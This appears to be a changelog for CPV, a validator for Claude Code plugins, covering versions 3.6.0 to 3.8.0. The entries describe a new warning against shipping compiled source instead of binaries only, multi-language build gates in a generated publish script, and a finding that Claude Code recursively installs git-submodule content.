— **Empirical discovery (verified, load-bearing):** Claude Code **recursively fetches git-submodule CONTENT on install**. Verified on PSS 3.10.8: its installed `rust/` submodule ships 18 files / 1.7 MB of Rust source (8 `.rs`, 3 `Cargo.toml`, `Cargo.lock`); the cache is not a git repo yet `rust/.git` is a `gitdir:` gitlink, and `pss_setup.py` fails if `rust/` is absent (assumes it pre-populated) → CC's recursive clone put it there. So a submodule pointer does NOT keep source out of the installed plugin. **User decision (2026-07-24): STRICT canon** — a compiled component ships ONLY its built binaries under `bin/` (ALL per-platform×arch: darwin/linux/windows × arm64/amd64/… + a dispatcher); NO source, NO build libs, NO build-source submodule. Source lives in a SEPARATE repo the build CI clones by pinned URL/tag (NOT a submodule), or a binary-carrier plugin. **Change:** `validate_plugin.py::validate_cross_platform` now emits `RC-SHIP-BINARY-ONLY` on a **build-source submodule** via `cpv_pipeline_profile.has_build_source_submodule` (checkout-independent — reads `.gitmodules`, dev-hints excluded — so it fires on the source-repo case where the submodule is a bare pointer, which CPV actually validates), REVERSING v3.7.0's "submodule = compliant". The in-tree-source WARN stays (submodule paths excluded to avoid double-warn); its message no longer recommends a submodule. +2 tests (`TestRcShipBinaryOnlyIssue175` now 6: in-tree-warns / submodule-ships-warns / gitmodules-pointer-only-warns / dev-submodule-no-warn / C#-warns / stray-no-warn). ruff + mypy(132) + cold self-validate `0/0/0/0` clean. **⚠ FOLLOW-UP (flagged to user):** the CC-recursion reality **falsifies** `cpv_validate_gitmodules.py` / strip-dev-parts (TRDD-793ac32a) premise — "CC never recurses at install → end user SAFE / dev artifacts don't ship" is empirically false (likely CC-spec drift); strip-dev-parts's value-prop is void and the submodule-URL-tampering surface is now user-facing. Needs a separate decision. #175 stays OPEN. version 3.8.0, test files 414. [[cpv-compiled-component-ship-only-binary-canon]] [[cc-spec-drift-check-method]]

**v3.7.0 — issue #175 Phase 2: compiled-component "ship-only-the-binary" canon (RC-SHIP-BINARY-ONLY WARN + generalized build gates)**
— extends Phase 1's Rust-only gates to ALL compiled languages (user directive: "all compiled projects must be handled like this — not only Rust, but Go/C/C++/C#/etc."). Two deliverables. **(1) Detector:** `validate_plugin.py::validate_cross_platform` gained **RC-SHIP-BINARY-ONLY** (WARN phase of warn→migrate→block): compile source committed as regular files in the plugin tree violates the canon — the installed plugin should ship ONLY the built binary (`bin/`); move the source to a SEPARATE repo referenced by a git-**submodule pointer** (source + build artifacts then never ship), or make the binary a separate binary-carrier plugin. Submodule-pointer source (the compliant PSS shape) does NOT warn — gated via `cpv_pipeline_profile._gitmodules_submodule_paths` + a relative-path prefix match (`source_paths` are plugin-root-relative, so the prefix test is sound); the warn is gated on a REAL compiled component (`has_bin`/`has_build_system`/`has_build_script`) so a stray example source never trips it. Also added C#/`.cs`, F#/`.fs`, ObjC/`.m` to the `compiled_languages` map and made `has_build_system` glob-aware (`*.csproj`/`*.fsproj` project names vary). **(2) Generalized gate:** the generated `publish.py` `G2e` went from Rust-only to a **table-driven compiled build gate** — Rust (clippy `-D warnings` + test), Go (vet+build+test), C#/.NET (`dotnet build`), Swift (`swift build`), Zig (`zig build`) — each self-detecting (globs its manifest, top-level-manifest filter) + degrade-if-toolchain-absent (WARN+skip) + BLOCK-on-failure + graceful build-timeout (only Rust/Go run a test cmd — their runners no-op on zero tests; the rest build-only to avoid a false "no tests" block). C/C++ is **detect-and-note** (non-uniform build systems have no false-block-safe universal local command → CI's controlled toolchain builds it; RC-SHIP-BINARY-ONLY still enforces the canon). +7 tests (`TestPublishPyLanguageGatesIssue175` now 11, two-sided across all langs + timeout + C/C++ note; `TestRcShipBinaryOnlyIssue175` 4: in-tree-warns / submodule-no-warn / C#-warns / stray-no-warn). Generated publish.py compiles; ruff + mypy(132) + self-validate clean. #175 stays OPEN — Phases 3–6 (mixed-language model, `/cpv-agent upgrade` migration + CC submodule-recursion verify, WARN→BLOCK escalation, PSS-compat proof + canon docs) follow. version 3.7.0, test files 414. [[lesson-verify-issue-is-not-already-shipped]]

**v3.6.0 — issue #175 Phase 1: self-detecting Rust + shell build gates (start of the compiled-component "ship-only-the-binary" canon)**
— issue #175 (from the ai-maestro-janitor Claude): CPV's canonical-pipeline regeneration of `publish.py` was **Python-only** and silently DROPPED a mixed plugin's `cargo clippy`/`cargo test`/`shellcheck` gates (a real clippy defect then ships unblocked). Root cause: the generated `publish.py` body is one language-invariant raw template string.
